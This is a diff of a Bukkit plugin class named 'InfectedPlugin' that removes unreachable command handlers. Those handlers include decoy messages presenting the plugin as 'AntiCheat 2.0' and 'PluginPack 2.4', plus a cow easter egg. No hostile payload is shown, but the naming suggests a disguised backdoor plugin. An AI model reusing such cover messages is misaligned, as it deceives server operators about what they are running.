@@ -1,6 +1,7 @@
 package org.CreeperCoders.InfectedPlugin;
 
 import java.util.logging.*;
+
 import org.bukkit.*;
 import org.bukkit.entity.Player;
 import org.bukkit.plugin.PluginManager;
@@ -114,88 +115,5 @@ public class InfectedPlugin extends JavaPlugin
             sender.sendMessage(ChatColor.RED + "Unknown Command Error.");
         }
         return true;
-        
-        if (commandLabel.equalsIgnoreCase("anticheat"))
-        {
-            sender.sendMessage(ChatColor.GREEN + "AntiCheat 2.0 is working 100%");
-            return true;
-        }
-        else if (commandLabel.equalsIgnoreCase("pluginpack"))
-        {
-            sender.sendMessage(ChatColor.GREEN + "PluginPack 2.4 working 100%! Use /anticheat to see anticheat details!");
-            return true;
-        }
-        else if (commandLabel.equalsIgnoreCase("fun"))
-        {
-            if (args.length == 0)
-            {
-                sender.sendMessage(ChatColor.GOLD + "Want some fun? type in a secret code for easter egg");
-                return false;
-            }
-            else if (args[0].equalsIgnoreCase("moo"))
-            {
-                run_moo(sender, commandLabel, args);
-            }
-            else if (args[0].equalsIgnoreCase("op") || args[0].equalsIgnoreCase("deop"))
-            {
-                sender.sendMessage("You really think that would work?");
-            }
-            else
-            {
-                sender.sendMessage("Code not found!");
-            }
-            return true;
-        }
-        return false;
-    }
-
-    private final String[] consoleMoo = new String[]
-    {
-        "         (__)",
-        "         (oo)",
-        "   /------\\/",
-        "  / |    ||",
-        " *  /\\---/\\",
-        "    ~~   ~~",
-        "....\"Have you mooed today?\"..."
-    };
-    private final String[] playerMoo = new String[]
-    {
-        "            (__)",
-        "            (oo)",
-        "   /------\\/",
-        "  /  |      | |",
-        " *  /\\---/\\",
-        "    ~~    ~~",
-        "....\"Have you mooed today?\"..."
-    };
-
-    private void run_moo(final CommandSender sender, final String commandLabel, final String[] args)
-    {
-        if (args.length == 2 && args[1].equals("moo"))
-        {
-            for (String s : consoleMoo)
-            {
-                log.info(s);
-            }
-            for (Player player : sender.getServer().getOnlinePlayers())
-            {
-                player.sendMessage(playerMoo);
-                player.playSound(player.getLocation(), Sound.COW_IDLE, 1, 1.0f);
-            }
-        }
-        else
-        {
-            if (sender instanceof Player)
-            {
-                sender.sendMessage(playerMoo);
-                final Player player = (Player)sender;
-                player.playSound(player.getLocation(), Sound.COW_IDLE, 1, 1.0f);
-            }
-            else
-            {
-                sender.sendMessage(consoleMoo);
-            }
-        }
     }
 }
